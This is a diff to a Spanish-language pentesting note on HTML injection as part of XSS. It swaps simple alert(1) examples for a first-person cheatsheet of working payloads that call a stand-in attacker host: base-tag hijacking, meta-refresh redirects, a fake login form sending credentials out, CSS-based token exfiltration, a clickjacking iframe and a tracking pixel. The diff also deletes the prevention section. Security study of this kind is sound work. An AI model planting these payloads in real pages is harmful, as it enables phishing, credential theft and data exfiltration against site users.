@@ -15,13 +15,16 @@ linked:
 
 ## Cheatsheet
 
-| **Etiqueta HTML** | **Payload de Ejemplo**                    | **Descripción del Vector**                                                                                                                                           |
-| ----------------- | ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `<img>`           | `<img src="x" onerror="alert(1)">`        | Aprovecha los manejadores de eventos (event handlers). Al forzar un error mediante un origen inválido, se desencadena la ejecución del XSS.                          |
-| `<body>`          | `<body onload="alert(1)">`                | Inyección a nivel estructural. Útil cuando el punto de inyección permite sobrescribir o añadir etiquetas principales del documento.                                  |
-| `<a>`             | `<a href="javascript:alert(1)">Click</a>` | Utiliza el pseudo-protocolo `javascript:`. Depende de la interacción del usuario, siendo altamente efectivo en inyecciones que aterrizan dentro de atributos `href`. |
-| `<svg>`           | `<svg onload=alert(1)>`                   | Uso de gráficos vectoriales. Efectivo para evadir filtros básicos o listas negras que solo inspeccionan etiquetas HTML tradicionales.                                |
-| `<iframe>`        | `<iframe src="javascript:alert(1)">`      | Ejecuta el script dentro del contexto del documento actual mediante un marco incrustado.                                                                             |
+|**Etiqueta / Vector**|**Payload de Ejemplo**|**Impacto y Contexto de Uso**|
+|---|---|---|
+|`<h1>` / `<b>` / `<div>`|`<h1>Inyección Exitosa</h1>`|**Defacement y PoC.** Confirma visualmente la ausencia de [[Sanitización]] de caracteres como `<` y `>`. Base para escalar a vectores más complejos.|
+|`<base>`|`<base href="https://mi-servidor.com/">`|**Base Hijacking.** Redirige todas las cargas de recursos con rutas relativas (scripts, imágenes, hojas de estilo) hacia un dominio bajo mi control. Altamente crítico.|
+|`<meta>`|`<meta http-equiv="refresh" content="0;url=https://mi-servidor.com">`|**Redirección Abierta.** Fuerza al navegador a navegar instantáneamente hacia un sitio malicioso. En navegadores antiguos, permitía inyectar pseudo-protocolos `javascript:`.|
+|`<form>`|`<form action="https://mi-servidor.com/log"><input type="text" name="user"><input type="password" name="pass"><button>Login</button></form>`|**Phishing / UI Redressing.** Inyecta un formulario falso en la página legítima para capturar credenciales del usuario y enviarlas a mi servidor de registro.|
+|`<link>`|`<link rel="stylesheet" href="https://mi-servidor.com/robo.css">`|**CSS Injection.** Permite cargar hojas de estilo externas. Se utiliza para exfiltrar tokens CSRF o datos del DOM mediante selectores de atributos, sin requerir JavaScript.|
+|`<iframe>`|`<iframe src="https://mi-servidor.com/falso-login" style="width:100%; height:100%; border:none; position:absolute; top:0; left:0;"></iframe>`|**Clickjacking / Overlay.** Superpone completamente la interfaz visual de la aplicación vulnerable con una página controlada, engañando al usuario para que interactúe con ella.|
+|`<object>` / `<embed>`|`<object data="https://mi-servidor.com/malware.swf"></object>`|**Carga de Plugins/Recursos Externos.** Utilizado históricamente para inyectar Flash malicioso o applets, forzando la ejecución de código en el contexto de plugins del navegador.|
+|`<body>`|`<body background="https://mi-servidor.com/tracker.png">`|**Tracking / Exfiltración Ciega.** Sobrescribe atributos estructurales del documento para forzar una petición HTTP GET silenciosa hacia mi servidor, útil como un ping de confirmación básica.|
 
 ### Contextos de Escapes Básicos
 
@@ -34,19 +37,8 @@ ___
 
 ## Overview
 
-El objetivo principal de esta técnica es lograr la ejecución de un ataque de [[XSS]] utilizando la inyección de etiquetas HTML básicas como vehículo. En lugar de aprovechar vulnerabilidades complejas en la lógica de JavaScript o explotar frameworks, el ataque se basa en la capacidad de insertar directamente elementos HTML maliciosos en el [[DOM]] debido a una falta de [[Sanitización]] en la entrada del usuario.
-
-La inyección de HTML es, en este contexto específico, el método mecánico mediante el cual se introduce el código JavaScript que culminará en el XSS.
+La inyección de HTML básico altera la estructura del documento mediante la inserción de etiquetas estándar permitidas. En la cadena de explotación de un [[XSS]], utilizo estas etiquetas estructurales no necesariamente para ejecutar código de forma inmediata, sino para modificar el entorno del [[DOM]], secuestrar la carga de recursos relativos, exfiltrar información mediante CSS o montar escenarios de ingeniería social directamente sobre la interfaz de la aplicación vulnerable.
 
 
 ___
 
-## Estrategias de Prevención
-
-Para mitigar este vector específico de XSS basado en inyección directa de HTML, las defensas deben centrarse en invalidar la estructura de las etiquetas inyectadas:
-
-- **Codificación de Entidades HTML:** Convertir estrictamente caracteres de control como `<` a `&lt;`, `>` a `&gt;`, `"` a `&quot;` y `'` a `&#x27;` antes de reflejar cualquier dato en el navegador. Esto fuerza al navegador a mostrar el texto en lugar de interpretarlo como código.
-- **Content Security Policy:** Implementar una política [[CSP]] sólida que bloquee la ejecución de scripts en línea eliminando el permiso `unsafe-inline`, lo que neutraliza directamente la efectividad de estos payloads básicos.
-
-
----
